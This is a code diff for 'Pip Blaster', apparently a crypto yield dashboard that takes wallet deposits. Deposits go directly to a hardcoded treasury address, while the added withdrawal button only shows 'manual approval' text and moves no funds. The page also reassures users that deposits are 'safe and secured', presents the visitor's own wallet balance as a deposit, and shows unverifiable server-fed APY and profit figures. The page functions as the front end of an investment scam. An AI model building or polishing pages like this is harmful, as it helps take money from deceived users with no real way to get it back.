@@ -7,7 +7,6 @@
 
 <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.11.1/dist/index.umd.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/ethers@6.9.0/dist/ethers.umd.min.js"></script>
-
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
 
 <style>
@@ -41,6 +40,11 @@ border:none;padding:14px;border-radius:14px;font-weight:700;cursor:pointer;color
 button.secondary{background:rgba(255,255,255,.1);color:#fff}
 input{width:100%;padding:14px;border-radius:12px;border:none;margin-bottom:12px}
 .status{margin-top:14px;font-size:13px;color:var(--accent)}
+.disclaimer{margin-top:26px;font-size:11px;color:#7e8896}
+.telegram-float{position:fixed;bottom:22px;right:22px;background:#0088cc;
+color:white;width:60px;height:60px;border-radius:50%;
+display:flex;align-items:center;justify-content:center;
+font-size:26px;text-decoration:none}
 </style>
 </head>
 
@@ -50,6 +54,10 @@ input{width:100%;padding:14px;border-radius:12px;border:none;margin-bottom:12px}
 <div class="header">
 <div class="logo"><div class="logo-mark">PB</div><div>Pip Blaster</div></div>
 <button class="secondary" onclick="connectWallet()">Connect Wallet</button>
+</div>
+
+<div class="table" id="recentActivity">
+  <div class="row">No recent activity</div>
 </div>
 
 <div class="grid">
@@ -70,74 +78,146 @@ input{width:100%;padding:14px;border-radius:12px;border:none;margin-bottom:12px}
 <div class="card">
 <div id="wallet">Not connected</div><br>
 <input id="amount" type="number" placeholder="Amount in ETH"/>
-<button onclick="deposit()">Deposit</button>
+<button onclick="deposit()">Deposit</button><br><br>
+<input id="withdrawAddress" placeholder="Wallet address"/>
+<button class="secondary" onclick="requestWithdrawal()">Request Withdrawal</button>
 <div class="status" id="status"></div>
+<div class="disclaimer">
+Deposits go to treasury, safe and secured.
+</div>
 </div>
 </div>
 </div></div>
 
+<a class="telegram-float" href="https://t.me/YOUR_TELEGRAM" target="_blank">
+<i class="fab fa-telegram-plane"></i></a>
+
 <script>
 const TREASURY_ADDRESS="0xac6Ac19C9773DC39300C5531984498fe3477E7D0";
-
-let provider;
 let userAddress;
-let depositLock=false;
+let provider;
+
+// DOM elements
+const walletEl = document.getElementById("wallet");
+const recentActivity = document.getElementById("recentActivity");
+const userProfitEl = document.getElementById("userProfit");
+const amountInput = document.getElementById("amount");
 
 // CONNECT WALLET
 async function connectWallet(){
-  provider=new ethers.BrowserProvider(window.ethereum);
-  const acc=await provider.send("eth_requestAccounts",[]);
-  userAddress=acc[0];
-  wallet.textContent=userAddress.slice(0,6)+"..."+userAddress.slice(-4);
-  loadMetrics();
-  loadProfit();
-}
+    if(typeof window.ethereum!=='undefined'){
+        provider = new ethers.BrowserProvider(window.ethereum);
+        const accounts = await provider.send("eth_requestAccounts", []);
+        userAddress = accounts[0];
+        walletEl.textContent = userAddress.slice(0,6)+"..."+userAddress.slice(-4);
+        renderDashboard();
+        return;
+    }
 
-// FIXED DEPOSIT LOCK
-async function deposit(){
-  if(depositLock) return;
-  if(!userAddress) return alert("Connect wallet");
-  const eth=amount.value;
-  if(!eth||eth<=0) return alert("Enter amount");
-
-  depositLock=true;
-  status.textContent="Processing...";
-
-  try{
-    const value="0x"+(eth*1e18).toString(16);
-    await ethereum.request({
-      method:"eth_sendTransaction",
-      params:[{from:userAddress,to:TREASURY_ADDRESS,value}]
+    // WalletConnect
+    const wcProvider = await EthereumProvider.init({
+        projectId:"fc500f0e843b93390b632d69567865db",
+        chains:[1],
+        showQrModal:true
     });
-    status.textContent="Deposit sent";
-  }catch(e){
-    status.textContent="Cancelled";
-  }
-
-  depositLock=false;
+    await wcProvider.enable();
+    window.ethereum = wcProvider;
+    provider = new ethers.BrowserProvider(window.ethereum);
+    userAddress = wcProvider.accounts[0];
+    walletEl.textContent = userAddress.slice(0,6)+"..."+userAddress.slice(-4);
+    renderDashboard();
 }
 
-// LOAD METRICS
+// DEPOSIT
+let depositInProgress = false;
+
+// DEPOSIT (fixed lock issue)
+async function deposit(){
+    if(depositInProgress) return; // prevent double click
+    if(!userAddress) return alert("Connect wallet");
+
+    const eth = amountInput.value;
+    if(!eth || eth <= 0) return alert("Enter valid amount");
+
+    depositInProgress = true;
+    status.textContent = "Processing deposit...";
+    const depositBtn = document.querySelector("button[onclick='deposit()']");
+    depositBtn.disabled = true;
+    depositBtn.style.opacity = "0.6";
+
+    try{
+        const value = "0x" + BigInt(Math.floor(eth * 1e18)).toString(16);
+
+        await ethereum.request({
+            method: "eth_sendTransaction",
+            params: [{
+                from: userAddress,
+                to: TREASURY_ADDRESS,
+                value
+            }]
+        });
+
+        status.textContent = "Deposit sent successfully";
+    } catch(e){
+        console.error(e);
+        status.textContent = "Transaction cancelled or failed";
+    } finally {
+        depositInProgress = false;
+        depositBtn.disabled = false;
+        depositBtn.style.opacity = "1";
+        renderDashboard();
+    }
+}
+
+// WITHDRAW REQUEST (manual)
+function requestWithdrawal(){
+    status.textContent="Withdrawal requested (manual approval)";
+}
+
+// FETCH METRICS FROM SERVER
 async function loadMetrics(){
-  const r=await fetch("/api/metrics");
-  const d=await r.json();
-  targetApy.textContent=d.targetApy;
-  activeApy.textContent=d.activeApy;
-  dailyPerf.textContent=d.dailyPerf;
+    try{
+        const res = await fetch("/api/metrics");
+        const data = await res.json();
+        targetApy.textContent = data.targetApy;
+        activeApy.textContent = data.activeApy;
+        dailyPerf.textContent = data.dailyPerf;
+    }catch(e){
+        console.error("Unable to load metrics", e);
+    }
 }
 
-// LOAD PROFIT
-async function loadProfit(){
-  if(!userAddress) return;
-  const r=await fetch(`/api/profit/${userAddress}`);
-  const d=await r.json();
-  userProfit.textContent=d.profit;
+// FETCH USER PROFIT FROM SERVER
+async function loadUserProfit(){
+    if(!userAddress) return;
+    try{
+        const res = await fetch(`/api/profit/${userAddress}`);
+        const data = await res.json();
+        userProfitEl.textContent = data.profit;
+    }catch(e){
+        console.error("Unable to load user profit", e);
+        userProfitEl.textContent = "$0.00";
+    }
 }
 
-setInterval(()=>{
-  loadMetrics();
-  loadProfit();
-},10000);
+// RENDER DASHBOARD
+async function renderDashboard(){
+    await loadMetrics();
+    if(!userAddress) return;
+    try {
+        const balanceWei = await provider.getBalance(userAddress);
+        const balanceEth = ethers.formatEther(balanceWei);
+        await loadUserProfit();
+        recentActivity.innerHTML = `<div class="row">${userAddress}: Deposit ${balanceEth} ETH, Profit ${userProfitEl.textContent}</div>`;
+    } catch(e){
+        console.error(e);
+        recentActivity.innerHTML = `<div class="row">Unable to load deposit</div>`;
+    }
+}
+
+// AUTO REFRESH
+setInterval(renderDashboard, 5000);
 </script>
 </body>
 </html>
+
